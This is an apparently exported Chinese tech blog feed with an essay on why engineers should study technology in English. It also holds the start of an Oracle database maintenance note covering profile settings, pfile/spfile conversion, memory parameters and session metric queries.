<li><a href="http://www.jianshu.com/p/cd7a12fa09bb">基于Redmine的项目管理平台</a></li>
</ul>
<h2 id="Research"><a href="#Research" class="headerlink" title="Research"></a>Research</h2><ul>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDkzNjIwMg==&amp;mid=2651660711&amp;idx=2&amp;sn=99034f5ea2e2bcf273782e05cf78b878&amp;chksm=8bbe8c42bcc90554a06ac80a16207db6198fa8a8d0c5bd81dbe9751d97cf27cb8fa8ea33e7fc&amp;mpshare=1&amp;scene=1&amp;srcid=0126FCe0uka9jHHXbABeCYPR#rd">Nature 论文|噬菌体之间的信息传递和群体决策</a></p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDkzNjIwMg==&amp;mid=201291634&amp;idx=1&amp;sn=c631663cad7b2d9c70420fce5ffc4b3a&amp;scene=1#rd">科学网论坛：你既然这样穷，为什么搞科研？</a></p>
</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li>《火的礼物-人类与计算技术的终极博弈（第4版）》，Sara Baase（莎拉芭氏）</li>
<li><a href="http://coolshell.cn/articles/17295.html">酷壳：让我们来谈谈分工</a></li>
<li><a href="http://www.infoq.com/cn/articles/how-to-interview-engineers?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">如何面试工程师 | Ammon Bartram </a></li>
<li><a href="https://mp.weixin.qq.com/s/b2bV_P7UzmMfNr-2fW89FQ">浅析在国内做不出好成果的原因 | 2015-11-16 鲍永利 科研圈</a></li>
<li><a href="http://icodeit.org/2018/01/two-types-of-developer/">团队里的两类程序员</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>eBook</tag>
        <tag>Engineering</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>工程师的自我修养：全英文技术学习实践</title>
    <url>/2017/06/27/Technology-English/</url>
    <content><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><blockquote>
<p>O’Reilly之所以能够负担起Perl和Apache领导人的薪水，是因为预期他们的工作能够让公司出售更多Perl和Apache相关的书籍，并吸引更多人参加其会议。— 《大教堂与集市》</p>
</blockquote>
<ul>
<li>全英文技术学习的必要性</li>
<li>如何实践全英文技术学习</li>
<li>一、搞一点翻译</li>
<li>二、精读原版教材</li>
<li>三、电子书必不可少</li>
<li>四、一切知识最后都要对应到人</li>
<li>五、善用效率工具，持续改进</li>
<li>总结：从input到output</li>
</ul>
<span id="more"></span>
<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>2016年9月，上海GOPS大会现场。《Site Reliability Engineering》一书的作者之一、来自Google的Chris Jones在做分享,  Chris说一句，他的前同事、中文版译者孙宇聪在一旁翻译一句。演讲人和翻译一句一顿，底下上千人坐着，像极了总理新闻发布会，场面一度尴尬。<a href="https://riboseyim.github.io/2016/09/24/GOPS">link</a> 可是话说回来了，要是不翻译，估计现场80%以上的人还真就听不明白在说啥，公开活动毕竟要照顾大多数。</p>
<p>本篇文章接下来将结合挨踢行业的一些情况，严肃地讨论一下技术人员的语言能力问题，希望您读完以后能够有所触动、有所行动、有所裨益。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/TE_Theme.png" alt=""></p>
<h2 id="全英文技术学习的必要性"><a href="#全英文技术学习的必要性" class="headerlink" title="全英文技术学习的必要性"></a>全英文技术学习的必要性</h2><h3 id="现实一：中国英文教育的全面失败"><a href="#现实一：中国英文教育的全面失败" class="headerlink" title="现实一：中国英文教育的全面失败"></a>现实一：中国英文教育的全面失败</h3><p>一般接受过小学教育的人都可以掌握中文，在日常生活中熟练应用：可以拿起一份报纸或者打开一个八卦网页看得津津有味。而反观我们的英文教育可以说是彻头彻尾的失败——投资巨大（据说很多城市中产阶级报的英语补习班，每学期学费约2.5万元）、旷日持久（完成本科教育也至少10几年吧），却少有人可以随便拿起一份英文报纸或者杂志看的津津有味。</p>
<p>本朝还有一大特色就是所谓的“专业英语”，几乎每个专业都安排了一个“XX专业英语”，列入课程、列入考试、列入职称评定等等。网上搜了一下，目前大概有100多种，实际效果如何呢？我想除了增加教材销售额，对相关从业人员的水平提高不会有什么用。</p>
<h3 id="现实二：中文出版市场的怪象"><a href="#现实二：中文出版市场的怪象" class="headerlink" title="现实二：中文出版市场的怪象"></a>现实二：中文出版市场的怪象</h3><p>根据有关调查数据，国民人均阅读图书4.25本（加上电子书就有5.77本了）。下列国家每年人均阅读的数量是：韩国11本、法国20本、日本40本、芬兰47本，以色列64本。这个调查数字不是非常权威，但是可以在出版市场获得验证：虽然我们是一个13亿人的国家，一年出版的图书中接近70%属于服务考试的教材，全国一年中销售过百万册的文艺类畅销书也不到10种，专业技术书籍就只能算非常小众的市场了。相关数据和生活观察都可以发现，很多人在接受完基础教育之后，基本上就不再看书了。</p>
<p>以IT行业为例，一本普通的专业技术书籍，销量和利润大概是多少呢？<br>保本：销售3000本以上<br>畅销书：销售几万本以上<br>大畅销书：销售几十万本以上<br>超级畅销书：销售一百万本以上</p>
<p>对比文艺类书籍，专业书籍是垂直市场、受众人群少、销量小。大部分（50%以上）的IT书籍，销售量不超过3000本，只能刚刚弥补纸张、印刷、作者、编辑的成本，对出版社来说，毫无利润。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/TE_Publish_Chinese_Computer.png" alt="中文图书出版市场-计算机类别"></p>
<h4 id="中文作者的报酬"><a href="#中文作者的报酬" class="headerlink" title="中文作者的报酬"></a>中文作者的报酬</h4><p>出版社给作者的版税是8%，现在一本书定价大约为50～100元，卖一本书作者到手4～8块，保本销售才到手12000～24000元，北上广稍微资深一点的码农月薪一般都比这个高，有写书的功夫还不都玩去了。翻译译者的报酬就更低了，已经十多年没有变了（耗时数月，斟酌字句：千字60元RMB)，所以技术书籍的译者，基本上是在为人民服务、跟做公益差不多。</p>
<p>中文出版市场恶性循环由此形成：需求畸形导致供应畸形，大部分人都去搞门槛低、利润高的考试教辅市场，其它作／译者能获得的报酬过低，报酬低又消灭高水平人士进入的热情，进一步限制了出版作品的质量，更没法吸引读者。</p>
<h3 id="现状三：中文对学术的贡献度低"><a href="#现状三：中文对学术的贡献度低" class="headerlink" title="现状三：中文对学术的贡献度低"></a>现状三：中文对学术的贡献度低</h3><p>如果前面两个问题还可以通过 <strong>国民教育改革</strong> 、<strong>知识产权制度建设</strong> 以及国内相关产业的<strong>技术提升</strong>而逐步改善，那么国人<strong>原创能力和动力不足</strong>的现实问题更加突出：互联网上有英语使用者9.5亿，中文网民7.6亿紧随其后，这个数量远远超过排名第三、只有2.9亿使用者的西班牙语网民。但是互联网的资讯数量，英语信息占到51.7%，紧随其后的俄语和日语信息，分别是6.5%和5.6%。中文排名一下子落到了第九位，只占整个互联网信息总量的2%，甚至还逊于2.5%的葡萄牙语、2.4%的意大利语。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/TE_Compare_20170629.png" alt="技术资料由英文转为中文目前还需要较长的周期"></p>
<p>上述数据显示：<strong>使用中文的人更喜欢浏览网络上的资讯，但对创作新的内容并不感兴趣</strong>。这一点亦可以在微信朋友圈上得到印证：大多数人习于转发，习惯于转述流行的热帖，而有一定创作能力或者说表达自己观点的人，可以说是凤毛麟角。</p>
<h2 id="如何实践全英文技术学习"><a href="#如何实践全英文技术学习" class="headerlink" title="如何实践全英文技术学习"></a>如何实践全英文技术学习</h2><p>了解上述三个现状，就可以发现这些问题都不是依靠几个宏伟命题、高喊几句口号可以在短期内根本改善的。那么作为一名有追求的工程师，该如何突破这些瓶颈，提高自己的长远竞争力呢？———— 全英文技术学习训练。接下来将我最近一段时间的训练总结如下，供各位读者交流、批判。</p>
<h3 id="一、搞一点翻译"><a href="#一、搞一点翻译" class="headerlink" title="一、搞一点翻译"></a>一、搞一点翻译</h3><p>关于全英文技术学习的思路，我是从业余翻译活动中获得的灵感。最早翻译的内容也不是技术方面，而是经济学人上面的文章：跟技术沾点边，又比较有趣的小短文。这样的文章，对于它的背景会比较熟悉，又不至于耗费太多精力，例如：</p>
<ul>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Economist译文:事与愿违的后门程序</a></li>
<li><a href="http://www.jianshu.com/p/d525f1a7fd25">Economist译文:印度电商竞赛</a></li>
</ul>
<p>体会到翻译的乐趣之后，我才开始寻找一些本专业的英文资料，翻译之后发在社区，取得了不错的反馈，例如：</p>
<ul>
<li><a href="https://riboseyim.github.io/2016/07/17/OpenSource-StackOverflow/">《Stack Overflow: The Architecture - 2016 Edition》</a></li>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术：Linux喜迎DTrace</a></li>
<li><a href="https://riboseyim.github.io/2016/04/24/LinusTorvalds/">Linux之父：Just for Fun！</a></li>
</ul>
<p>翻译的过程其实就是对原文知识的再强化、再巩固的过程，译的过程中任何混淆不清的地方都需要反复揣摩、查阅第三方资料求证，直到译完之后就会发现，对比刚开始粗粗阅览的时候已经有了更深刻的理解。但是 <strong>搞一点翻译最重要的心得就是：翻译根本靠不住！</strong></p>
<p>我首先承认：由于水平有限，之前以及往后发布的翻译作品肯定会有错误、疏漏，或者不得已“模糊”处理的地方。有些东西实在很难找到合适的中文表达方式，或者说译者对于原文也会有不明白、理解错误的地方，自己尚且如此，何况其他译者乎？ 现实中很多人完全依赖翻译资料学习技术，这种侥幸心理实在过于乐观。</p>
<p>另外，据我所知国内有些技术Leader，都有 <strong>带领团队翻译书籍</strong> 的习惯。翻译是最适合团队合作的游戏之一，既能提高大家的学习能力、表达能力，又能训练团队密切协作，这是多Cool的事啊！以后有机会专门写篇讨论下。</p>
<h3 id="二、精读原版教材"><a href="#二、精读原版教材" class="headerlink" title="二、精读原版教材"></a>二、精读原版教材</h3><p>对于计算机专业，或者对于经济、金融、卫生、法律、管理等专业来说也一样，本来中文语境下就没有这类专业，纯属舶来品，用英文去学习和理解反而更加简单。在大量的英文资料中，大致可以分为如下几类：</p>
<ul>
<li>专业领域术语。最省事最高效的方法就是上维基百科把每个词都查一遍。</li>
<li>HandBook。</li>
<li>经典教材</li>
<li>经典论文。广义上还包括各种<a href="https://riboseyim.github.io/2017/05/12/Protocol-RFC/">RFC文件</a></li>
<li>发明者的论述&amp;培训讲义</li>
<li>应用者的讨论与实践总结</li>
<li>实践应用。实践出真知，读完以上所有资料之后顶多算得到一些认识，要升华为自己掌握的知识，必须通过实践综合运用。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/TE_Known_King.png" alt=""></p>
<p>从经典的入门专业教材一本本开始读起，找自己专业教材对应的英文原版或者参考书刊的对应原版。</p>
<blockquote>
<p>当时班上一哥们问我如何能过英语六级考试，我就建议他改看计算机类的原版教材，别再看中文教材了，这样本专业和英语两不误。结果后来他果然轻松过了六级，貌似考得比我还高呢。后来他逢人就夸我的法子好，哈哈！ ——— 章亦春 @agentzh</p>
</blockquote>
<p>但是这招并不一定每个人都能接受，初试者开始可能很不适应，因为中英文教材的编写思路不太一样，例如知乎上有一个话题：<a href="https://www.zhihu.com/question/22241846">为什么觉得英文原版教材很啰嗦？</a> 我们习惯的中文教材比较简明，上来肯定是先告诉你概念，接着进行解释阐述。英文教材的习惯则是“发现问题——思考问题——提出结论——引入话题”的次序，属于“由点到面”的思路。关于这个问题，我更喜欢引用机械工业出版社华章系列书中的《出版者的话》：</p>
<blockquote>
<p>文艺复兴以降，源远流长的科学精神和逐步形成的学术规范，使西方国家在自然科学的各个领域取得了垄断性的优势，也正是这样的传统，使美国在信息技术发展的六十年间名家辈出、独领风骚。在商业化的进程中，美国的产业界和教育界越来越紧密地结合，计算机学科中的许多泰山北斗同时身处科研和教学的最前线，由此产生的经典科学著作，不仅擘划了研究的范畴，还揭示了学术的源变，既遵循学术规范，又自有学者个性，其价值并不会因年月的流逝而减退。</p>
</blockquote>
<p>其要者无非有二：一者领先优势显著、独步天下，二者大佬辈出、产业和学术高度融合。具体案例就是，很多技术发明或者开源软件项目都是以学术论文的形式进入公众视野的。例如Hadoop项目的《MapReduce:Simplified Data Processing on Large Clusters》、《The Google File System》,Ganglia项目的《 The ganglia distributed monitoring system: design, implementation, and experience》。论文的可读性很强，能看到发明者设计初衷、实现原理甚至测试数据等。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Ganglia_DIE.png" alt=""></p>
<h3 id="三、电子书必不可少"><a href="#三、电子书必不可少" class="headerlink" title="三、电子书必不可少"></a>三、电子书必不可少</h3><p>一本书从开始写作到最终出版，要经过很多环节。忽略掉写作过程，从交稿到出版会经历很多次审核和校对，可能会历时4-8个月，着这个过程中，很多东西都可能发生了变化。如果原版为英文版，等到翻译成中文再出版，书中的很大一部分内容可能已经过时。这种现状随着技术的更新速度和频率还会再加剧。</p>
<p>作为一种知识载体，电子书的重要性不言而喻。而且个人更加倾向于推荐在线版的电子书，例如GitBook。对作者而言，它没有任何的审核流程，没有出版门槛，也没有排版的时间消耗，只需要关注内容即可。于读者而言，它可以提供持续更新，可以在很大程度上降低读者的风险（快递费，等待时间等），也提供了读者和作者直接沟通的平台渠道。</p>
<h3 id="四、一切知识最后都要对应到人"><a href="#四、一切知识最后都要对应到人" class="headerlink" title="四、一切知识最后都要对应到人"></a>四、一切知识最后都要对应到人</h3><blockquote>
<p>世界上少数专家的强大输出，贡献了绝大多数的优质学习资源。</p>
</blockquote>
<p>例如，我对系统性能优化方面受益最多的来自于 <strong>Brendan Gregg</strong>，他维护的个人博客发布了大量的原创内容，出版了包括<a href="">《性能之巅》</a>在内的一大批书籍，囊括了性能问题领域的技术、工具、方法论等方方面面，并且持续保持着活跃的更新频率。又如kanban这一方法论，我很多年前就已经知道，但是一直不甚了了、未能实践，但是看过 <strong>Marcus Hammarberg</strong> 的视频<a href="">《Kanban in Action》</a>之后，一下子就有触类旁通的感觉，很快就能娴熟应用。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/TE_Slideshare_PPT.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/PM_Tools_kanban_Demo_6.png" alt=""></p>
<h3 id="五、善用效率工具，持续改进"><a href="#五、善用效率工具，持续改进" class="headerlink" title="五、善用效率工具，持续改进"></a>五、善用效率工具，持续改进</h3><p>千里之行，始于足下。上面提到的所有设想都需要行动才能转化为结果，这会是一个漫长而艰难的过程，既需要足够的耐心也需要一些工具和方法论的辅助：个人推荐GTD（Getting Things Done），它是一种行为管理的方法，其主要原则在于一个人需要通过记录的方式把头脑中的各种任务移出来。通过这样的方式，头脑可以不用塞满各种需要完成的事情，而集中精力在正在完成的事情。</p>
<blockquote>
<p>“把所有事情都从你的脑袋里弄出来。在事情出现，而不是在事情爆发的时候,就做好相关行动的一系列决定。以合适的类别组织好你的项目的各种提醒以及下一步的行动。保持你的系统更新和完整，充分地检查，使你在任何时候都能信任你的对于你正在做（或者不做）的事情直觉的选择。”</p>
</blockquote>
<p>一般过程：“搜集-处理-整理-行动-检查”。举例：将Twitter上发现的感兴趣内容发送到OmniFocus收件箱，整理分类并 <strong>设置一个要求完成时间</strong> （最关键的要素，没有完成时间的计划都是耍流氓），定期检查待办事项完成情况，再开启下一轮调整优化。<br><img src="http://riboseyim-qiniu.riboseyim.com/PM_Tools_Mac_Service_Right.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/PM_Tools_OmniFocus_New.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/PM_Tools_OmniFocus_CheckDone.png" alt=""></p>
<h2 id="总结：从input到output"><a href="#总结：从input到output" class="headerlink" title="总结：从input到output"></a>总结：从input到output</h2><blockquote>
<p>you can’t connect the dots looking forward; you can only connect them looking backwards.<br>—— Steve Jobs</p>
</blockquote>
<p>回到本文开头，关于国内开技术大会还需要现场翻译，我相信未来总有一天会通过技术进步来解决这个问题。面对技术的不断更新换代，持续学习能力才是增强竞争力的不二法门。获得知识的途径早已不限于各种专业技术书籍、同行经验交流，社区分享，博客，公众号，推特，电子书和在线视频等新载体层出不穷，突破语言瓶颈的要义在于提高交流学习的视野、借用天下资源为我所用，最终目的还是服务我们的实践活动。当我们的实践达到相当的深度和广度，自然可以通过早已建立的、世界范围的联系发挥影响力。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.chinaqw.com/news/2006/0116/68/13285.shtml">美军方推出“战略要地语言”教育计划　包括汉语 | 2006年01月16日</a></li>
<li><a href="https://mp.weixin.qq.com/s/yx85CyI-LCcbaZ69kY8yKQ">施一公：如何提高自己的专业英文文献阅读能力丨医麦精品汇 | 2018-03-12 施一公 医麦客</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI0MjY0OTkxNw==&amp;mid=2247486113&amp;idx=1&amp;sn=e0f873be4fa2ade4e4c1855553c5e3ff&amp;chksm=e97854f3de0fdde5048600a259e68673036f0701778a4f254473c63747243166ba4bd784833d&amp;mpshare=1&amp;scene=1&amp;srcid=0601l0wqez1ugHgXQsNjNRrN#rd">魏祢:不懂英语，造就了13亿人的信息孤岛</a></li>
<li><a href="http://mp.weixin.qq.com/s?__biz=MjM5MzA0ODkyMA==&amp;mid=211925813&amp;idx=2&amp;sn=0e9c817c4b3a8347e63a91f6ee97aa1f&amp;mpshare=1&amp;scene=1&amp;srcid=1102hLZpXjHA2L6390LtcYQD##">邱俊涛：技术人员如何写一本书</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI4MzExMDU1Nw==&amp;mid=2649858997&amp;idx=1&amp;sn=08d95ad869dbc882a9c9e66fe690e319&amp;chksm=f38abe47c4fd37510d247e6d8f31d86c7457eaefefb04f6670df42a2df1ff36e8df5b454c2ae&amp;mpshare=1&amp;scene=1&amp;srcid=0421oW6WxbHp907tR50v9iWI#rd">恶魔奶爸Sam:如何才能熟练阅读各类英文报刊</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI4MzExMDU1Nw==&amp;mid=2649859187&amp;idx=1&amp;sn=3398451ee69c4a397d3c503c2693fb2e&amp;chksm=f38ab981c4fd30974551592e98d25ef991291e0c2d573b0b2d04321ecfac6c6d19e6a5acd564&amp;mpshare=1&amp;scene=1&amp;srcid=0601ptqyHE4XERrvzYa2tCm9#rd">恶魔奶爸Sam:怎么解决专业英语的问题？</a></li>
<li><a href="https://dotblogs.com.tw/hatelove/2017/03/26/why-engineers-should-keep-blogging">Joey Chen:我为什么鼓励工程师写Blog</a></li>
<li><a href="http://www.sohu.com/a/143634471_767148">搜狐新闻：中产教育鄙视链-绝不让娃和没英文名的孩子同读</a></li>
<li><a href="https://finland.fi/zh/shenghuoyushehui/reaiyuedudefenlanren/">热爱阅读的芬兰人</a></li>
<li><a href="http://wenshu.court.gov.cn/content/content?DocID=ae8a516f-fbf7-4f66-82f6-830900b58b8d">裁判文书网：北京中青文文化传媒有限公司与北京百度网讯科技有限公司侵害作品信息网络传播权纠纷申请再审民事裁定书</a></li>
<li><a href="https://mp.weixin.qq.com/s/nEar1NvzfJ5Kj7aI9g057Q">如何正确选择合适自己的英文学习方法和材料？原创 2016-06-07 恶魔奶爸</a></li>
<li><a href="https://mp.weixin.qq.com/s/3gTVt4EzMqL-L30nxEg6ew">推荐两本语法练习册（选做）| 原创 2016-07-13 恶魔奶爸Sam</a></li>
<li><a href="https://mp.weixin.qq.com/s/0PwiQSC8r6e7D3rUTIO1aw">英语口语水平影响阅读英文资讯或者文学作品吗？| 原创 2016-09-18 恶魔奶爸Sam</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI4MzExMDU1Nw==&amp;mid=2649858086&amp;idx=1&amp;sn=e488231ff110a4b746a286a79a0c6815&amp;scene=1&amp;srcid=0824yA3pgjqTG3o7WZAxmUg6#rd">恶魔奶爸Sam@英文词典知多少</a></li>
<li><a href="https://mp.weixin.qq.com/s/G-2FkB8uABwxHHoQg2qWvQ">学好英语的核心是写作｜BetterRead | 2016-07-25 金雯 BetterRead</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
        <tag>Engineering</tag>
        <tag>网络协议</tag>
        <tag>Developer</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle 数据库日常维护</title>
    <url>/2018/11/21/Technology-Oracle-Ops/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>【编辑中】</li>
<li>init params</li>
<li>files tree</li>
</ul>
<span id="more"></span>
<h2 id="INSTALL"><a href="#INSTALL" class="headerlink" title="INSTALL"></a>INSTALL</h2><h4 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sql</span><span class="operator">&gt;</span><span class="keyword">alter</span> <span class="keyword">user</span> USER_NAME identified <span class="keyword">by</span> USER_PASSWD;</span><br><span class="line"></span><br><span class="line"><span class="comment">--查看用户的proifle，默认：default</span></span><br><span class="line"><span class="keyword">sql</span><span class="operator">&gt;</span><span class="keyword">SELECT</span> username,PROFILE <span class="keyword">FROM</span> dba_users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">sql</span><span class="operator">&gt;</span><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> dba_profiles s <span class="keyword">WHERE</span> s.profile<span class="operator">=</span><span class="string">&#x27;DEFAULT&#x27;</span> <span class="keyword">AND</span> resource_name<span class="operator">=</span><span class="string">&#x27;PASSWORD_LIFE_TIME&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">sql</span><span class="operator">&gt;</span><span class="keyword">ALTER</span> PROFILE <span class="keyword">DEFAULT</span> LIMIT PASSWORD_LIFE_TIME UNLIMITED;</span><br><span class="line"><span class="keyword">sql</span><span class="operator">&gt;</span><span class="keyword">ALTER</span> PROFILE <span class="keyword">DEFAULT</span> LIMIT PASSWORD_LIFE_TIME <span class="number">90</span>;</span><br></pre></td></tr></table></figure>
<h4 id="Init-Params"><a href="#Init-Params" class="headerlink" title="Init Params"></a>Init Params</h4><ul>
<li><p>初始化参数文件（Initialization Parameters Files,pfile）<br>pfile 默认为“init+例程名.ora”,文本文件，可以手工编辑。</p>
</li>
<li><p>spfile:服务器参数文件（Server Parameter Files）<br>spfile 默认为“spfile+例程名.ora”，<strong>不能用vi编辑器对其中参数进行修改，只能通过命令在线修改。</strong></p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- $ORACLE_HOME/dbs/spfiledbnms.ora</span></span><br><span class="line"><span class="comment">--pfile格式转换：将二进制转换为文本格式</span></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">CREATE</span> Spfile <span class="keyword">FROM</span> pfile;</span><br><span class="line">这种方法，然后再用vi编辑器对其中的参数进行直观修改，以达到方便的目的。</span><br><span class="line"></span><br><span class="line"><span class="comment">--pfile格式转换：将文本转为二进制格式</span></span><br><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">CREATE</span> pfile <span class="keyword">FROM</span> Spfile;</span><br><span class="line"></span><br><span class="line"># df <span class="operator">-</span>k <span class="operator">/</span>dev<span class="operator">/</span>shm</span><br><span class="line">Filesystem     <span class="number">1</span>K<span class="operator">-</span>blocks  Used Available Use<span class="operator">%</span> Mounted <span class="keyword">on</span></span><br><span class="line">tmpfs            <span class="number">4194304</span>   <span class="number">288</span>   <span class="number">4194016</span>   <span class="number">1</span><span class="operator">%</span> <span class="operator">/</span>dev<span class="operator">/</span>shm</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><a href="https://docs.oracle.com/cd/B19306_01/server.102/b14237/initparams193.htm#REFRN10256">SGA</a></li>
<li><a href="https://docs.oracle.com/cd/B19306_01/server.102/b14237/initparams157.htm#REFRN10165">pga_aggregate_target</a></li>
</ul>
<p>SGA_TARGET specifies the total size of all SGA components.<br>If SGA_TARGET is specified, then the following memory pools are automatically sized:</p>
<ul>
<li>Buffer cache (DB_CACHE_SIZE)</li>
<li>Shared pool (SHARED_POOL_SIZE)</li>
<li>Large pool (LARGE_POOL_SIZE)</li>
<li>Java pool (JAVA_POOL_SIZE)</li>
<li>Streams pool (STREAMS_POOL_SIZE)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pga_aggregate_target = total memory - SGA</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>When setting this parameter, you should examine the total memory on your system that is available to the Oracle instance and subtract the SGA. You can assign the remaining memory to PGA_AGGREGATE_TARGET.</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment"># example:vi $ORACLE_HOME/dbs/spfiledbnms.ora</span></span><br><span class="line"><span class="comment"># dbnms.__java_pool_size=939524096</span></span><br><span class="line"><span class="comment"># dbnms.__large_pool_size=805306368</span></span><br><span class="line">dbnms.__java_pool_size=<span class="number">4294967296</span></span><br><span class="line">dbnms.__large_pool_size=<span class="number">4294967296</span></span><br><span class="line">dbnms.__oracle_base=<span class="string">&#x27;/oracle/product&#x27;</span><span class="comment">#ORACLE_BASE set from environment</span></span><br><span class="line"><span class="comment">#dbnms.__pga_aggregate_target=16106127360</span></span><br><span class="line">dbnms.__pga_aggregate_target=<span class="number">0</span></span><br><span class="line"><span class="comment">#dbnms.__sga_target=64424509440</span></span><br><span class="line">dbnms.sga_target=<span class="number">4294967296</span></span><br><span class="line">dbnms.__shared_io_pool_size=<span class="number">0</span></span><br><span class="line">dbnms.__shared_pool_size=<span class="number">4697620480</span></span><br><span class="line">dbnms.__streams_pool_size=<span class="number">0</span></span><br><span class="line">*.audit_file_dest=<span class="string">&#x27;/oracle/product/admin/dbnms/adump&#x27;</span></span><br><span class="line">*.audit_trail=<span class="string">&#x27;db&#x27;</span></span><br><span class="line">*.compatible=<span class="string">&#x27;11.2.0.4.0&#x27;</span></span><br><span class="line">*.control_files=<span class="string">&#x27;/oradata1/dbnms/control01.ctl&#x27;</span>,<span class="string">&#x27;/oradata2/dbnms/control02.ctl&#x27;</span></span><br><span class="line">*.db_block_size=<span class="number">8192</span></span><br><span class="line">*.db_domain=<span class="string">&#x27;&#x27;</span></span><br><span class="line">*.db_name=<span class="string">&#x27;dbnms&#x27;</span></span><br><span class="line">*.diagnostic_dest=<span class="string">&#x27;/oracle/product&#x27;</span></span><br><span class="line">*.dispatchers=<span class="string">&#x27;(PROTOCOL=TCP) (SERVICE=dbnms)&#x27;</span></span><br><span class="line">*.open_cursors=<span class="number">300</span></span><br><span class="line"><span class="comment">#*.pga_aggregate_target=16106127360</span></span><br><span class="line">*.pga_aggregate_target=<span class="number">0</span></span><br><span class="line">*.processes=<span class="number">1500</span></span><br><span class="line">*.remote_login_passwordfile=<span class="string">&#x27;EXCLUSIVE&#x27;</span></span><br><span class="line">*.sessions=<span class="number">1655</span></span><br><span class="line"><span class="comment"># *.sga_target=64424509440</span></span><br><span class="line">*.sga_target=<span class="number">4294967296</span></span><br><span class="line">*.undo_tablespace=<span class="string">&#x27;UNDOTBS1&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="Optimizing"><a href="#Optimizing" class="headerlink" title="Optimizing"></a>Optimizing</h2><h4 id="Metric"><a href="#Metric" class="headerlink" title="Metric"></a>Metric</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;vsession:&#x27;</span><span class="operator">||</span><span class="built_in">count</span>(<span class="operator">*</span>)<span class="operator">||</span><span class="string">&#x27;&#x27;</span> <span class="keyword">as</span> moni <span class="keyword">from</span> v$session</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;maxsessions:&#x27;</span><span class="operator">||</span><span class="keyword">value</span><span class="operator">||</span><span class="string">&#x27;&#x27;</span> <span class="keyword">as</span> sessions <span class="keyword">from</span> v$<span class="keyword">parameter</span> <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;sessions&#x27;</span></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;vprocess:&#x27;</span><span class="operator">||</span><span class="built_in">count</span>(<span class="operator">*</span>)<span class="operator">||</span><span class="string">&#x27;&#x27;</span> <span class="keyword">from</span> v$process</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;maxprocess:&#x27;</span><span class="operator">||</span><span class="keyword">value</span><span class="operator">||</span><span class="string">&#x27;&#x27;</span> <span class="keyword">from</span> v$<span class="keyword">parameter</span> <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;processes&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="Events"><a href="#Events" class="headerlink" title="Events"></a>Events</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> v$event_name;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> v$<span class="keyword">sql</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> p.spid, s.osuser, s.program ,p.<span class="operator">*</span> <span class="keyword">from</span> v$session s,v$process p <span class="keyword">where</span> s.paddr<span class="operator">=</span>p.addr   <span class="keyword">and</span> s.SID<span class="operator">=</span><span class="string">&#x27;8463&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">---eg:Buffer Busy 